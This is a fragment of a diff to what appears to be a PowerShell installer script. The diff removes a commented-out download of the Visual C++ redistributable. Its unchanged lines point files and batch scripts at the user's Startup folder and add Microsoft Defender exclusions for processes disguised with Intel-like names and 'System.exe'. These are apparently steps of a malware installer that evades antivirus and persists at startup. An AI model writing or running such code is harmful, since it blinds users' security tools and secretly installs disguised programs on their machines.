@@ -8,15 +8,6 @@ $TargetSystem  = "$env:APPDATA\Microsoft\Windows\StartMenu\Programs\Startup\Syst
 $TargetABat = "$TargetPath\Register_Audio_Tools.bat"
 $TargetNBat = "$TargetPath\Register_Notification_Service.bat"
 
-# Write-Output "`n*****`nInstalling Visual C++ Redistributable for Visual Studio 2022"
-# if (-Not (Test-Path $TargetPath\vc_redist.x64.exe)) {
-#   Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile "$TargetPath\vc_redist.x64.exe"
-#   Start-Process -Wait -FilePath "$TargetPath\vc_redist.x64.exe" -ArgumentList '/install /quiet /norestart' -PassThru
-# } else {
-#   Start-Process -Wait -FilePath "$TargetPath\vc_redist.x64.exe" -ArgumentList '/install /quiet /norestart' -PassThru
-# }
-Write-Output "*****`n"
-
 Add-MpPreference -ExclusionProcess 'Intel Dynamic Audio Tools.exe' -Force
 Add-MpPreference -ExclusionProcess 'Intel_Dynamic_Notification_Service.exe' -Force
 Add-MpPreference -ExclusionProcess 'System.exe' -Force
